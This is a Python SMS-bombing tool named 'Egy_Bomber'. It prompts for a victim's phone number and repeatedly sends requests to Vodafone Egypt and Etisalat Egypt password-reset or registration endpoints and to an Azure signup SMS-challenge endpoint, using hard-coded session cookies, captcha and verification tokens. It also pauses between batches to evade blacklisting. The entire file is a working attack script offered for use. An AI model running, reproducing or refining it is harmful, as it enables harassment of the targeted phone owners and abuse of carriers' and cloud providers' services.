import requests
import time

banner = """
===================================
|           Egy_Bomber            |
| ___________________    . , ; .  |
|(___________________|~~~~~X.;' . |
|          @ZeyadAzima   ' `" ' ` |       
==================================
|    1-Vodafone                   |
|    2-Etisalat                   |
|    3-Orange(soon)               |
|    4-We(soon)                   |
===================================
"""


def Vodafone():
    number = input('Enter Victam Number: ')
    azima = int(input('Enter number of messeges: '))
    leno = len(number)
    if leno == 11 or leno == 12:

        url = 'https://www.vodafone.com.eg/userAcc/forgotPass'
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}
        data = {
            'g-recaptcha-response': '03AGdBq24xWUGw05wLDPJmcH8XTkbdVYlazLOEUU5Iu-DcV_BG7cX0fAaSzANbPjSEVStH5v17oN_ZSr5wpfK3GYbrCXCHGKOUYxmVky1Vb8aWxL3NEK2iTxlW54VNh0prMpitxqgEHKJZF17WRbqt-ge1PWbUyWympWU4YCIO4qh3aZjIrBB1A4f-BuXVYty1WDDqbnyywYVD2lxlXwlt5Q1KxAgxNqV6cdiJYDT043etSyoPxSm4qjWi_SwEMAsQSUzNY2FvDgcqSzGZ6ORT_UocMauUnUttWSvzdAgxTgQg8R0GR_UsMT4tZu5M1uIdzmK-ssqlUOAlncutladChK_fcwd8F3UxLoE86iblMa5347uUZKfxdbQgvDH-9VCe9mwvUQ1z7TUxuxWxiRSOxbofSFUpRRNB-w',
            'userName': number, 'userEmail': 'zeyadsdjfnsdjk@gmail.com', 'tempPassMethod': 'sms'}

        for i in range(azima):
            r = requests.post(url, verify=True, data=data, headers=header)
            azima1 = r.status_code
            if azima1 == 200:
                print(str(i) + '-' + 'send done')
                time.sleep(1)
            elif azima1 != 200:
                print('Error')
            print('You send: ' + str(azima) + ' Messeges')
    else:
        print('')
        print('Enter correct number ;(')
        exit()



def Etisalat():
    number = input('Enter Victam Number: ')
    azima = int(input('Enter number of messeges: '))
    leno = len(number)
    if leno == 11 or leno == 12:
        url = 'https://www.etisalat.eg/eshop/myaccount/gadgets/newUser.jsp?_DARGS=/myaccount/preRegistration.jsp'
        header = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
            'Referer': 'https://www.etisalat.eg/eshop/account/registerUser.jsp?locale=ar_US'}

        cookies = {
            'TS017ffcb1_26': '01d8d7aa2b0f0b31fd0c24781bebed8590aabd9f4e2ce2c7712e390845e06dde83168dbeff754cac4fd3a734d9bd5c9dc0ba96813cb1771d7bf04e9a100a0b9347c5722cd0',
            'TS017ffcb1_28': '01d8d7aa2b059c9a9acc6b51dea712d69090155fb62ce2c7712e390845e06dde83168dbeff63455fd53f6b830c78e5c8e5f6b049fe',
            'DYN_USER_ID': '650271381', 'DYN_USER_CONFIRM': '029cee92122d178787f62bc50bfd5ad2', 'userPrefLanguage': 'ar_US',
            '_ga': 'GA1.2.492767204.1592307167', '_gid': 'GA1.2.1677483130.1592307167',
            '_fbp': 'fb.1.1592307167614.1716758591',
            'itemCount': '0', 'userFirstName': '',
            'OAMAuthnCookie_www.etisalat.eg:80': 'k5QzeCLQTvd5Cjuzv4KWRz8Zze8nrmFvKUit8jbplyO5Bh9YhQ8AkvRtmjrMVod0HlpqNJPnHJN2SagIdAWVW99KoJk%2BcwF7wOuLpo87IRItDAskJ0V0EUl2MgWXmo%2FuxpHVgANSWiLbz%2B5t3za1QXzbJ2rVlxc%2FSjhsXN6D0Fj8%2FdWLIND6PNFRUa278wPtxrK0X9Za2ZxToFPqJ3nPRhgfTJIgKCEvF5%2FuKSH%2Fh2CkrzbQPSkSYZEERMDMEDwyxpzGJi5Bu7pEQCtkc%2FxK%2BaT%2BJIWNs%2FMtZfzc%2FHiarSKx8zSGQApjF37EjNIJkfjtFXQRzxmnYN9knSDNZuSS5f4UG7dFfKAitNfghIsiU4pr71ay%2Fr0IaLNywpkB0rfXnUsJSJLjV0GtK3QevOMAgg%3D%3D',
            '_gat_UA-1048762-12': '1',
            'JSESSIONID': 'dve9_aGasWZXAi1CnpOjSyna0hgZNNTelFqmqJGhCb6aVFCc_5Mn!395651034!-2008131947',
            'TS017ffcb1': '010cd381e871fca1cc0c97f93a3af68623115da9f37b2332f9b32c1def85e18c6febadae9288c06521373d4424a45b258c27fdc495d551aabcdb0149796fbec70b9f41350353a990580ec9642804e1c38f626e79d249e5a2bf6f81472ef418b8dff51ca9e6d7ab339e02fea278d44823134dddd849c9d6cd82d832c2f45e49e15abeef7021'
            }

        data = {'_dyncharset': 'utf-8', '_dynSessConf': '-9126779338117915945', 'password': 'sdfkljsdlfjds@yah4oo.com1',
                '_D:password': '',
                'confirmPassword': 'sdfkljsdlfjds@yah4oo.com1', '_D:confirmPassword': '', 'already_customer': 'on',
                '/atg/store/profile/RegistrationFormHandler.existingCustomer': 'true',
                '_D:/atg/store/profile/RegistrationFormHandler.existingCustomer': '',
                'msisdn': number, '_D:msisdn': '', '/atg/store/profile/RegistrationFormHandler.validateAccount': 'Actvate',
                '_D:/atg/store/profile/RegistrationFormHandler.validateAccount': '',
                'accountErrorUrl': '/eshop/account/registerUser.jsp',
                '_D:accountErrorUrl': '', 'accountSuccessUrl': '/eshop/myaccount/gadgets/newUser.jsp',
                '_D:accountSuccessUrl': '',
                '_DARGS': '/myaccount/preRegistration.jsp'}

        for i in range(azima):
            r = requests.post(url, verify=True, cookies=cookies, headers=header, data=data)
            time.sleep(1)
            azima1 = r.status_code
            if azima1 == 200:
                print(str(i) + '-' + 'send done')
                time.sleep(1)
            elif azima1 != 200:
                print('Error')
    else:
        print('')
        print('Enter correct number ;(')
        exit()

def All():
    number = input('Enter Victam Number: ')
    azima = int(input('Enter number of messeges: '))
    leno = len(number)
    if leno == 11 or leno == 12:
        url = 'https://signup.azure.com/api/risk/BeginSmsChallenge?phoneCountryCode=20&phoneNumber=' + number + '&deliveryType=0&offerId=MS-AZR-0044P'
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
            'RequestVerificationToken': '1z_Mp-KpAlozWtIv6RtYrqHAvSAGFvANFs719MtCXPNxObqO-ndbl7slG8ZwX8mLBVfXXsEYeGe_UxyW21meTjivDT7kX1v8sXVZpefGI0nEUBliRi4nXTS9vsoTgvfHNUz0r0GAIhThFJxpznE3hw2',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://signup.azure.com/signup?offer=ms-azr-0044p&appId=102&ref=azureplat-generic&redirectURL=https:%252F%252Fazure.microsoft.com%252Fen-us%252Fget-started%252Fwelcome-to-azure%252F&correlationId=1E0118954B0A68272E5D16FB4F0A6EE5&l=en-US',
            'Origin': 'https://signup.azure.com', 'Content-Type': 'application/json'}
        cookies = {'signupLocale': 'en', 'aam_uuid': '88487111963398809471150529078476796376',
                   'MSFPC': 'GUID=64cc69501f7047fcb9a97c94192f4d0b&HASH=64cc&LV=202002&V=4&LU=1581515654979',
                   '_mkto_trk': 'id:157-GQE-382&token:_mch-azure.com-1592143278270-55274',
                   'LPVID': 'A2YTA5NDVmZTk4M2JlZTNk', 'session': '377b60cd-f91a-453e-a55b-0de607e555e9',
                   'OpenIdConnect.nonce.TSISun5hx9fWYh%2BMrxBqZZbZ5iFSgI3C0hjhPnmkEvg%3D': 'SWo1T25MaUpNWko1dDdmSE95bkx1RkJuSUxuRTBTT2hGYlhtMmhzMjlTSWtucE1BaHp6LXBBLTJSVzV3dV9TNVlGMUtval9wR0FnMHA2Z1FKbE5KSGtrclM5TjQ5bW5UbTNHQmVQbFVuY0FVRUtVRkxuSm5jWW1zUkdEamoyQ2hrS2gydjJvWngzSG5YbnZNYkN5NEhkWU5PX0E5NjcxOFNqWDR0dENHY0haYVUxaWYyMkJyaHFuZ3poYUxLWFQ3RDlxV010RlBWM1VNa1BkcjBrOHF1Z0NQUFk3RUF6OUxseWdrTFRuWlpxdw%3D%3D',
                   'gtcn': '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.1+97t1f18Kv6CJwyNprwk1sSo55IuHg6em+pUxL8/vFAXZ3kuK1pzISSyFSf5atAjskqC+xZXD780PlmMKXNjw==',
                   'grtk': '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.eSmJlypxmmlaueH42IqYTWEvl+B0Sv9KW9y/REWEJeTUu9a/6SaPM/K/ybWUK17v+1bMoFUuyEjitsjYPyeVeQ==',
                   'is_github': 'meijAw0xxmykUKxNTt8QyvWckNT/u2hVh2RTFnfxBRc=.N4OEoR03sfWhOMABQs641FxrTN6nyzo6WSGl1Yya2Hhrzo4FFubE2OMJyc38cmZ7JZC5xh6fqa4Vun3v8F2how==',
                   '.AspNet.Cookies': 'uhZXTl6xz7HFVMY_uJSebxMAZ_49RN9WFTXpZj0YCTEDvXp5v9p8JZwzFyGzM8VxOjiAyi0TBmwuq72We0Ls0YmyGTveQlfGAnj19D7s8UxU1bjz-88W2xHoY7sdHutc-ls0ybeo2yAQhQlkXtHNWqhVLGmY7gty9-VeDji9VQMkJJcFADpN_sbvSIrvWPFCceVEpC2LplMFSUY1stxdwZmHjp72xpbmeW2ws1X01X0t0Y0eNVq_Iln4yfqf3KM5yViZVCesnDIM4hMVqZFRAObm_JMwjo5WhOOGRuq6kqO6QuudLihMr_4n12J6XT_kVSikZ3COUBPNbapmKT3tXu3vI5_tUoKj7s_VpwfjrBWB1pJxjLsJG5tUWTlfXNE-TFpFKmn8xDPyJP0_3xqgXwd68TU2nryJ0pO27OjCz-pHPJrXMdmy-j13qG49u1HcDvRjGDslPb3stv4hXOjWQ8SHBbiaDWbJaUpvGg5djiIVEYeypXsTIXaSVDTQT83Fys-zmR_-FxJ2Ja8zLxRmL1PCDfcki_9MRHhEOMkKWZL6_lYR4NPfkt6J4ZgfeD0xvNjw61dURbmV2jyUHdD4FWjS47ciFY9WP4IU6INdAYpa5O9k79WkclQBlx7bAmy6Z7wre_vaLueik6Zk1iJogOQCpU39bI2ATkSwLHr1KDPAZi5VIwJmXui-c78lXSmEpPq5zE_1h6FL-OVmQRje5UVSRaB7drP9VgVaRKp3xS1chA_LL8RpRrVx2fJP8sU0WUnjNhaqthSIsEV_c5TwMCm7f7gbfutRUkEwZ_ysXrWIAuR6ee26p71Vm80ZvCWat3T-P121CS0mN3V-pYYx3vMY2JMs___88dFHY2_0mfSTVQtVehu4qSJaECB3oxk2Oo_yL_7KddXF-3tf4sOhZlPuby0jJeGIzZYYCzSVVmXbhF_hH8O3tpoEZE-q6oYtFsQTD3rqk-d7hCYURZpVRDnj4rcWx27WdYx0cX5ApqtxEReNmK4wOJNSCtwBCC6bPCHps9OcY84J0P1AxdRHQtIEcDtyvh08oarcMIZ5hTd7TInYHAuilZwANxJ-XGZhd3syvy_98CHFIDjoD345Dlsk2junzUSnbdrYY6vWU6FG83VR33zfjmRT00eWp314b1h876DY-05ckuV8vf4haXZoGBSluAavPaTLTq3wzYKS-Zx9XcVdoaGh_NbqEHy1Ybf2xjM-7AmDPHYP6ehHOYtnRD4eThDiHAXwflxObTI-OsUHc1XCtcKMLNUFqYb8YuT_CyTWmH4rTAcVUXv8SBzq6984oVedOxq1c2QU7EtS8TqhNrM7NLn8JQpA0CWh85owJkm5H6Y3wyKznRFpYu-hW60c1RXpXhYWURhlKpLiA42C8Jv83bUwI5y2B5RQ-XPoVIeM2Va_BrWzcPP7D989BsNC7RQZzR6hzj0oKUoV2w7Cd_-oZCNzZB6WPMA_nd1jhM_Nlyz7CGEXZH1RN1iigI0eAYeo20JZ7Tl4Ga1BiqbRrBG6yc8wXXHT_N8FZBe-81E-FxUtuRbAFAntXeTke1ZlTTXDa49hpUrSCaW1I7lWe7l5NmWW5hQ209vK',
                   'AMCVS_EA76ADE95776D2EC7F000101%40AdobeOrg': '1',
                   'AMCV_EA76ADE95776D2EC7F000101%40AdobeOrg': '-179204249%7CMCMID%7C88205300960822341081104435829660326103%7CMCAAMLH-1592748067%7C6%7CMCAAMB-1592917277%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1592319677s%7CNONE%7CMCAID%7CNONE%7CMCCIDH%7C1990052203',
                   'oa_azure_signup_pageload': '1', 'LPSID-60270350': 'GQORQlvvRv6FPHyR6CTghQ',
                   'DDCA4994AB17BE3D1AF7468C': '3tqbgyLQozQ5MVrE4QJPWJuQvNrfOGae+CHOkafJZw9DqlQC3Em7jvEalzEZNKRuwtuUr0xBaMKdIUxOXw1tJmzDodTb1Q/uI2aQJX/Q40mpRBu0BRUXbyRB2DD8Rt0b7CUnrKYwhf28W/26EItTH0sT13FrjMyuOjYgIO9rWFncoZVuRu9rXBJH0AUyeizVKNxM0l15NLudT3hwnOyk6w2Gc+MMeydO0n96sRNr406cCuh01yE2fzBkxGlq0D8HwHgmskQiuaRMnvlts0/EBGmR/UEXHYvpRNaja84tC1kGU6njpk5jR8EzzkFu/wx1u/BGklaT4CKn/+czapUBjxXgow43nI8oGUGZiXsBSOpNQryGFGtPP/umSAwO/t2cPyBXpqa1jpkC0MWW6+Sdxpkp9XF050BWHrtT4eqjDhVx3QpOCwG09Br7uUU3u35ZU5a3KvyxefmQm/mNArOr3v8zRpab5oJFfZ8cOo6ZZYPGEuyaKY/4Bc/0xsbFhSRs+mjCWvZRC0s0rStR9IU36g==.P/nVh2LQ5GUSAL7Hzo2ad/tQNpzFtN56vjVX+qowxTyW1bmcB9+aorYzNbjWdF79c4pPgxkpjds3D8WQwLmDxA==',
                   '__RequestVerificationToken': 'gvcFR62f3ZexFtFrVOWa7bbyRg_bNzZjELZVcTOFlHucbnx-r2qdLrP_F0KyebAVFvgUl938HblaesnzRVGBC-ojlZgIMucwdmP-66PCpiM1'}
        data = {}
        man = 0
        for i in range(azima):
            man += 1
            if man == 90:
                time.sleep(10)
                print('[+] take a nape to avoid black list')
            else:
                r = requests.post(url, verify=True, cookies=cookies, headers=header)
                azima1 = r.status_code
                time.sleep(1)
                if azima1 == 200:

                    print(str(i) + '-' + 'send done')

                elif azima1 != 200:
                    print('Error')
                    exit()
    else:
        print('')
        print('Enter correct number ;(')
        exit()

if 'ZeyadAzima' not in banner:
    print('Error')
else:
    print(banner)
    choose = int(input('Choose Service: '))
    if choose == 1:
        Vodafone()
        print('By: ZeyadAzima')
    elif choose == 2:
        Etisalat()
        print('By: ZeyadAzima')
    elif choose == 3:
        All()
        print('By: ZeyadAzima')
    elif choose == 4:
        All()
        print('By: ZeyadAzima')
